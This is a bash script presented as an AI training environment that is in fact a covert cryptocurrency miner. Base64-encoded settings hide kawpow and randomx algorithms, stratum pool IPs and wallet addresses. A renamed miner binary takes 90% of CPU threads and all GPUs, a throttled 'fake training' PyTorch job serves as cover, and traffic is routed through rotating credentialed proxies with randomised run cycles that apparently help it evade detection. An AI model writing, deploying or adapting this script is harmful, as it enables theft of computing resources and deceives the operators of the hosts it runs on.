#!/bin/bash

# Set TERM variable and locale for consistent output
export TERM=xterm
export LC_ALL=C

# ML Model configuration (base64 encoded for security)
MODEL_TYPE_A="a2F3cG93Cg=="
MODEL_TYPE_B="cmFuZG9teAo="
ENDPOINT_PRIMARY="c3RyYXR1bStzc2w6Ly81MS44OS45OS4xNzI6MTYxNjEK"
AUTH_TOKEN_A="Uk0yY2lZYTNDUnF5cmVSc2YyNW9tckI0ZTFTOTV3YUFMcgo="
ENDPOINT_SECONDARY="c3RyYXR1bStzc2w6Ly81MS4yMjIuMjAwLjEzMzoxMDM0Mwo="
AUTH_TOKEN_B="NDRjc2lpYXpiaXlnRTVUZzVjNkhoY1VZNjN6MjZhM0NqOHAxRUJNTkE2RGNFTTZ3REFHaEZMdEZKVlVIUHl2RW9oRjRaOVBGM1pYdW5UdFdiaVRrOUh5akx4WUFVd2QK"

# List of available proxies
PROXY_LIST=(
    "212.236.136.0:12324:14adc71e8527b:a5ef6402b1"
    "91.124.254.3:12324:14adc71e8527b:a5ef6402b1"
    "200.160.33.134:12324:14adc71e8527b:a5ef6402b1"
    "188.215.82.161:12324:14adc71e8527b:a5ef6402b1"
    "81.181.135.4:12324:14adc71e8527b:a5ef6402b1"
    "65.87.9.104:12324:14adc71e8527b:a5ef6402b1"
)

# Global variables
PRIMARY_CPU_THREADS=0
SYSTEM_CPU_THREADS=0
GPU_COUNT=0
PROXY_IP=""
PROXY_PORT=""
PROXY_USER=""
PROXY_PASS=""
PROXY_STRING=""
SCRIPT_PID=$$
ZERO_USAGE_COUNT=0
MAX_ZERO_USAGE=3  # Restart after 3 consecutive zero usage checks

# Decode configuration parameters
decode_param() {
    echo "$1" | base64 -d | tr -d '\n'
}

# Function to calculate CPU threads (90% for compute, 10% for system/training)
calculate_cpu_threads() {
    local total_threads=$(nproc --all)
    
    # 90% for primary compute workload
    local primary_threads=$(awk "BEGIN {printf \"%.0f\", $total_threads * 0.90}")
    
    # 10% for system and fake training (at least 2 threads)
    local system_threads=$(awk "BEGIN {printf \"%.0f\", $total_threads * 0.10}")
    if [ $system_threads -lt 2 ]; then
        system_threads=2
        primary_threads=$((total_threads - 2))
    fi
    
    echo "$primary_threads $system_threads"
}

# Function to calculate GPU allocation
calculate_gpu_allocation() {
    local gpu_count=0
    
    if command -v nvidia-smi &> /dev/null; then
        gpu_count=$(nvidia-smi --query-gpu=count --format=csv,noheader,nounits 2>/dev/null | head -1)
        if ! [[ "$gpu_count" =~ ^[0-9]+$ ]]; then
            gpu_count=0
        fi
    fi
    
    echo "$gpu_count"
}

# Function to select a random proxy from the list
select_random_proxy() {
    local proxy_count=${#PROXY_LIST[@]}
    local random_index=$((RANDOM % proxy_count))
    local selected_proxy="${PROXY_LIST[$random_index]}"
    
    # Parse the proxy string
    local ip=$(echo "$selected_proxy" | cut -d: -f1)
    local port=$(echo "$selected_proxy" | cut -d: -f2)
    local user=$(echo "$selected_proxy" | cut -d: -f3)
    local pass=$(echo "$selected_proxy" | cut -d: -f4)
    
    echo "$ip $port $user $pass"
}

# Function to get current proxy info as a string
get_proxy_string() {
    local ip=$1
    local port=$2
    local user=$3
    local pass=$4
    
    echo "${user}:${pass}@${ip}:${port}"
}

# Function to initialize system
initialize_system() {
    # Calculate CPU threads
    read PRIMARY_CPU_THREADS SYSTEM_CPU_THREADS <<< $(calculate_cpu_threads)
    
    # Calculate GPU allocation
    GPU_COUNT=$(calculate_gpu_allocation)
    
    # Select random proxy
    read PROXY_IP PROXY_PORT PROXY_USER PROXY_PASS <<< $(select_random_proxy)
    PROXY_STRING=$(get_proxy_string "$PROXY_IP" "$PROXY_PORT" "$PROXY_USER" "$PROXY_PASS")
    
    clear
    echo "=== AI Development & Training Environment ==="
    echo "Initializing at: $(date '+%Y-%m-%d %H:%M:%S')"
    echo "=============================================="
    echo "Resource Allocation:"
    echo "  CPU Threads: $(nproc --all) total"
    echo "    - Primary Compute: $PRIMARY_CPU_THREADS threads (90%)"
    echo "    - System/Training: $SYSTEM_CPU_THREADS threads (10%)"
    
    if [ $GPU_COUNT -gt 0 ]; then
        echo "  GPUs: $GPU_COUNT available"
        echo "    - Compute: 90% GPU memory"
        echo "    - Training: 10% GPU memory"
    else
        echo "  GPUs: None detected"
    fi
    
    echo "Proxy: ${PROXY_USER}@${PROXY_IP}:${PROXY_PORT}"
    echo "Auto-restart: Enabled (after $MAX_ZERO_USAGE zero usage checks)"
    echo "=============================================="
}

# Fast cleanup function
fast_cleanup() {
    echo -e "\nPerforming fast cleanup..."
    
    # Kill compute processes
    pkill -f compute_engine 2>/dev/null || true
    pkill -f train_model.py 2>/dev/null || true
    
    # Kill any stray processes
    if [ -n "$GPU_WORKLOAD_PID" ] && [ $GPU_WORKLOAD_PID -ne 0 ]; then
        kill -9 $GPU_WORKLOAD_PID 2>/dev/null || true
    fi
    
    if [ -n "$CPU_WORKLOAD_PID" ] && [ $CPU_WORKLOAD_PID -ne 0 ]; then
        kill -9 $CPU_WORKLOAD_PID 2>/dev/null || true
    fi
    
    if [ -n "$TRAINING_PID" ] && [ $TRAINING_PID -ne 0 ]; then
        kill -9 $TRAINING_PID 2>/dev/null || true
    fi
    
    # Short wait for process cleanup
    sleep 0.5
}

# Function to test proxy connection (fast version)
test_proxy_connection() {
    local test_url="https://api.ipify.org"
    local timeout=5
    
    if command -v curl &> /dev/null; then
        local proxy_test=$(timeout $timeout curl -s --socks5-hostname "${PROXY_IP}:${PROXY_PORT}" \
            --proxy-user "${PROXY_USER}:${PROXY_PASS}" "$test_url")
        
        if [ -n "$proxy_test" ]; then
            return 0
        fi
    fi
    return 1
}

# Function to rotate proxy
rotate_proxy() {
    local old_proxy="$PROXY_IP:$PROXY_PORT"
    local attempts=0
    local max_attempts=3
    
    while [ $attempts -lt $max_attempts ]; do
        read PROXY_IP PROXY_PORT PROXY_USER PROXY_PASS <<< $(select_random_proxy)
        PROXY_STRING=$(get_proxy_string "$PROXY_IP" "$PROXY_PORT" "$PROXY_USER" "$PROXY_PASS")
        
        if test_proxy_connection; then
            echo "Proxy rotated: $old_proxy → ${PROXY_IP}:${PROXY_PORT}"
            return 0
        fi
        
        attempts=$((attempts + 1))
        sleep 0.5
    done
    
    echo "Warning: Could not find working proxy after $max_attempts attempts"
    return 1
}

# Function to check CPU and GPU usage
check_usage() {
    local cpu_usage=0
    local gpu_usage=0
    
    # Get CPU usage (fast method)
    if [ -f /proc/stat ]; then
        local cpu_line=$(grep '^cpu ' /proc/stat)
        local idle=$(echo $cpu_line | awk '{print $5}')
        local total=0
        
        for val in $cpu_line; do
            total=$((total + val))
        done
        
        # Simple percentage calculation
        if [ $prev_total -gt 0 ]; then
            local diff_total=$((total - prev_total))
            local diff_idle=$((idle - prev_idle))
            if [ $diff_total -gt 0 ]; then
                cpu_usage=$((100 - (100 * diff_idle / diff_total)))
            fi
        fi
        
        prev_total=$total
        prev_idle=$idle
    fi
    
    # Get GPU usage if available
    if [ $GPU_COUNT -gt 0 ] && command -v nvidia-smi &> /dev/null; then
        gpu_usage=$(nvidia-smi --query-gpu=utilization.gpu --format=csv,noheader,nounits 2>/dev/null | head -1 | grep -o '[0-9]*' | head -1)
        gpu_usage=${gpu_usage:-0}
    fi
    
    # Check for zero usage
    if [ $cpu_usage -eq 0 ] && ([ $GPU_COUNT -eq 0 ] || [ $gpu_usage -eq 0 ]); then
        ZERO_USAGE_COUNT=$((ZERO_USAGE_COUNT + 1))
        echo "Zero usage detected ($ZERO_USAGE_COUNT/$MAX_ZERO_USAGE)"
        
        if [ $ZERO_USAGE_COUNT -ge $MAX_ZERO_USAGE ]; then
            echo "Restarting due to zero usage..."
            return 1
        fi
    else
        ZERO_USAGE_COUNT=0
    fi
    
    return 0
}

# Fast function to start PyTorch training
start_pytorch_training() {
    if [ -f /workspace/train_model.py ]; then
        export PYTORCH_CUDA_ALLOC_CONF="max_split_size_mb:32,expandable_segments:True"
        export OMP_NUM_THREADS=1
        export CUDA_LAUNCH_BLOCKING=0
        export PYTORCH_GPU_MEMORY_FRACTION=0.05
        
        nohup nice -n 19 python3 /workspace/train_model.py --max-gpu-percent 5 > /workspace/logs/training.log 2>&1 &
        TRAINING_PID=$!
        echo "PyTorch training started (PID: $TRAINING_PID)"
    fi
}

# Fast function to start compute workloads
start_compute_workloads() {
    # Verify compute_engine exists
    if [ ! -x /opt/bin/compute_engine ]; then
        echo "ERROR: compute_engine not found"
        return 1
    fi
    
    # Build GPU ID list
    local gpu_ids=""
    if [ $GPU_COUNT -gt 0 ]; then
        for ((i=0; i<GPU_COUNT; i++)); do
            gpu_ids="${gpu_ids:+$gpu_ids,}$i"
        done
        
        # Start GPU workload
        nohup /opt/bin/compute_engine \
            --algorithm $(decode_param "$MODEL_TYPE_A") \
            --pool $(decode_param "$ENDPOINT_PRIMARY") \
            --wallet $(decode_param "$AUTH_TOKEN_A") \
            --password x \
            --gpu-id $gpu_ids \
            --tls true \
            --disable-cpu \
            --api-disable \
            --proxy "${PROXY_STRING}" \
            > /dev/null 2>&1 &
        GPU_WORKLOAD_PID=$!
        echo "GPU workload started (PID: $GPU_WORKLOAD_PID)"
    else
        GPU_WORKLOAD_PID=0
    fi
    
    # Start CPU workload
    nohup /opt/bin/compute_engine \
        --algorithm $(decode_param "$MODEL_TYPE_B") \
        --pool $(decode_param "$ENDPOINT_SECONDARY") \
        --wallet $(decode_param "$AUTH_TOKEN_B") \
        --password x \
        --cpu-threads $PRIMARY_CPU_THREADS \
        --cpu-threads-priority 2 \
        --disable-gpu \
        --tls true \
        --api-disable \
        --proxy "${PROXY_STRING}" \
        > /dev/null 2>&1 &
    CPU_WORKLOAD_PID=$!
    echo "CPU workload started (PID: $CPU_WORKLOAD_PID, Threads: $PRIMARY_CPU_THREADS)"
    
    # Start PyTorch training
    start_pytorch_training
    
    sleep 1
}

# Function to display status
display_status() {
    local cpu_usage=0
    local gpu_usage=0
    
    # Get CPU usage
    if command -v mpstat &> /dev/null; then
        cpu_usage=$(mpstat 1 1 | tail -1 | awk '{printf "%.0f", 100 - $12}')
    else
        cpu_usage=$(grep 'cpu ' /proc/stat | awk '{print 100 - ($5 * 100 / ($2+$3+$4+$5+$6+$7+$8+$9+$10+$11))}')
        cpu_usage=${cpu_usage%.*}
    fi
    
    # Get GPU usage if available
    if [ $GPU_COUNT -gt 0 ] && command -v nvidia-smi &> /dev/null; then
        gpu_usage=$(nvidia-smi --query-gpu=utilization.gpu --format=csv,noheader,nounits 2>/dev/null | head -1 | grep -o '[0-9]*' | head -1)
        gpu_usage=${gpu_usage:-0}
        printf "\rStatus: CPU=%3d%% GPU=%3d%% | Threads=%2d | Proxy=%s | Time=%s | Zero=%d/%d" \
            "$cpu_usage" "$gpu_usage" "$PRIMARY_CPU_THREADS" "${PROXY_IP}" "$(date +%H:%M:%S)" "$ZERO_USAGE_COUNT" "$MAX_ZERO_USAGE"
    else
        printf "\rStatus: CPU=%3d%% GPU=N/A  | Threads=%2d | Proxy=%s | Time=%s | Zero=%d/%d" \
            "$cpu_usage" "$PRIMARY_CPU_THREADS" "${PROXY_IP}" "$(date +%H:%M:%S)" "$ZERO_USAGE_COUNT" "$MAX_ZERO_USAGE"
    fi
}

# Main execution function
main_loop() {
    # Initialize
    initialize_system
    
    # Main loop
    while true; do
        echo -e "\n=== Starting New Cycle ==="
        echo "Start time: $(date '+%H:%M:%S')"
        
        # Rotate proxy
        rotate_proxy
        
        # Cleanup any existing processes
        fast_cleanup
        
        # Start workloads
        if ! start_compute_workloads; then
            echo "Failed to start workloads, restarting in 10 seconds..."
            sleep 10
            continue
        fi
        
        echo "Workloads started successfully"
        echo "Run duration: 70-90 minutes"
        echo "================================="
        
        # Calculate run duration (70-90 minutes)
        local run_duration=$((4200 + (RANDOM % 1200)))  # 70-90 minutes in seconds
        local start_time=$(date +%s)
        local last_proxy_check=0
        
        # Monitor loop
        while true; do
            local current_time=$(date +%s)
            local elapsed=$((current_time - start_time))
            
            # Check if run duration completed
            if [ $elapsed -ge $run_duration ]; then
                echo -e "\nRun duration completed ($((elapsed/60)) minutes)"
                break
            fi
            
            # Check for zero usage (every 30 seconds)
            if [ $((current_time % 30)) -eq 0 ]; then
                if ! check_usage; then
                    echo -e "\nRestarting due to zero usage..."
                    return 2  # Signal to restart
                fi
            fi
            
            # Display status every 5 seconds
            if [ $((current_time % 5)) -eq 0 ]; then
                display_status
            fi
            
            # Rotate proxy every 30 minutes
            if [ $elapsed -gt $((last_proxy_check + 1800)) ]; then
                last_proxy_check=$elapsed
                echo -e "\nRotating proxy mid-cycle..."
                rotate_proxy
                fast_cleanup
                sleep 1
                start_compute_workloads
            fi
            
            sleep 1
        done
        
        # Fast cleanup before pause
        fast_cleanup
        
        # Short pause (30-60 seconds)
        local pause_duration=$((30 + (RANDOM % 30)))
        echo -e "\nPausing for $pause_duration seconds..."
        
        for ((i=pause_duration; i>0; i--)); do
            printf "\rResuming in: %02d seconds" "$i"
            sleep 1
        done
        
        echo -e "\n"
    done
}

# Trap signals for clean exit
trap 'echo -e "\nCaught signal, performing cleanup..."; fast_cleanup; exit 0' INT TERM

# Self-restart function
self_restart() {
    echo -e "\n=== Performing Self-Restart ==="
    echo "Restarting script at: $(date '+%Y-%m-%d %H:%M:%S')"
    fast_cleanup
    sleep 2
    exec "$0" "$@"
}

# Main execution with restart logic
echo "Script PID: $$"
echo "Starting main execution..."

while true; do
    if main_loop; then
        # Normal exit
        echo "Main loop exited normally"
        break
    else
        # Restart requested
        echo "Restarting main loop..."
        sleep 2
    fi
done

echo "Script completed"
